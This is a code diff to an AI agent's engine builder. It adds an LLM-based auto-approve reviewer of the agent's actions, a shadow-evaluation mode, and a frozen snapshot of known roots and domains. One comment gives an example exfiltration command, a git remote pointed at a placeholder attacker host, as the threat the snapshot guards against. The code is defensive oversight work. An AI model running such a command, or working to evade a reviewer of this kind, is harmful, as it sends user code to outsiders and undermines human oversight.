@@ -33,6 +33,7 @@ from .memory import (
 )
 from .permissions import Mode, PermissionEngine
 from .project import load_agents_md
+from . import session_facts
 from .roots import RootDir, normalize_roots, render_context
 from .providers import ProviderClient, ProviderRouter
 from .overrides import RiskOverrideStore
@@ -222,6 +223,11 @@ def build_engine(
     connector_filter: Optional[set[str]] = None,
     # A set (static snapshot) or a zero-arg callable (live, re-evaluated per load_skill).
     skill_filter: Optional[set[str] | Callable[[], set[str]]] = None,
+    # Auto-Approve flags (spec Part 8 / §1.5). None ⇒ read the config.toml value; the server
+    # passes its prefs-backed booleans so the GUI Settings toggle takes effect. Both stores
+    # are user-global, preserving the "a repo can't enable this" invariant.
+    auto_approve: Optional[bool] = None,
+    auto_approve_shadow: Optional[bool] = None,
     # Persona-carried skill folders (OPE-58): the bundle's skills/ dir joins the loader so
     # its skills are readable by load_skill, not just listed by the filter.
     extra_skill_dirs: Optional[list[str | Path]] = None,
@@ -421,6 +427,7 @@ def build_engine(
             allowed_commands if allowed_commands is not None else config.allowed_commands
         ),
         auto_allow_tools=set(config.auto_allow),
+        allowed_domains=list(config.allowed_domains),
         roots=root_list or None,
         risk_overrides=risk_overrides,
     )
@@ -523,6 +530,59 @@ def build_engine(
     engine.todo = todo  # type: ignore[attr-defined]
     engine.agent_name = agent.name  # type: ignore[attr-defined]
     engine.roots = root_list  # type: ignore[attr-defined]  # shared list; Slice C mutates in place
+    # Session facts (spec Part 0 / §2.4): freeze the known world NOW, before the agent has
+    # acted. Freezing is the whole point — compared against live state, an agent that runs
+    # `git remote add backup https://attacker.net/…` would make its own destination look
+    # familiar. Nothing consumes this in v1; ingestion is recorded to the audit log only.
+    engine.session_facts = session_facts.SessionFacts(
+        world=session_facts.capture(
+            roots=root_list,
+            allowed_domains=config.allowed_domains,
+            workspace=ws,
+        )
+    )
+
+    # §1.9: the web_search approval card names the LIVE destination ("Queries go to your
+    # configured search provider (currently: ‹name›)"). Resolved when the card is raised,
+    # not at session start, so a mid-session Settings change shows through.
+    def _approval_extras(tool_name: str, _arguments: dict) -> dict:
+        if tool_name == "web_search":
+            from .web import provider_name
+
+            return {"search_provider": provider_name(secrets)}
+        return {}
+
+    engine.approval_extras = _approval_extras
+    # Auto-Approve reviewer (spec Part 8). Attached only when the user-global flag is on —
+    # a repo config can never enable it (`auto_approve` is in _GLOBAL_ONLY_FIELDS, same
+    # rule as `auto_allow`). With no reviewer attached, Mode.AUTO_APPROVE behaves exactly
+    # like INTERACTIVE, which is also the fallback for unattended sessions and after the
+    # per-turn retry guard trips (engine._reviewer_active). Uses the session's own
+    # provider and model: no second key, and if it's trusted to drive the agent it's
+    # strong enough to review it (§1.5).
+    #
+    # The two flags may be overridden by the caller (the GUI Settings toggle persists them
+    # to the user-global prefs store, which the server reads and passes here); None ⇒ take
+    # the config.toml value. Both stores are user-global, so a repo still can't turn either
+    # on regardless of which path set it.
+    live_on = auto_approve if auto_approve is not None else getattr(config, "auto_approve", False)
+    shadow_on = (
+        auto_approve_shadow
+        if auto_approve_shadow is not None
+        else getattr(config, "auto_approve_shadow", False)
+    )
+    if live_on or shadow_on:
+        from .reviewer import Reviewer
+
+        engine.reviewer = Reviewer(
+            provider=provider,
+            model=model,
+            known_world=engine.session_facts.world.render(),
+        )
+        # Shadow evaluation (Part 6 step 3): with only the shadow flag on, the reviewer is
+        # attached but the LIVE path stays off unless the session is actually in
+        # Mode.AUTO_APPROVE — shadow verdicts are recorded on approval cards in any mode.
+        engine.reviewer_shadow = bool(shadow_on)
     engine.audit_context = {
         "session_id": session_id or "",
         "agent": agent.name,
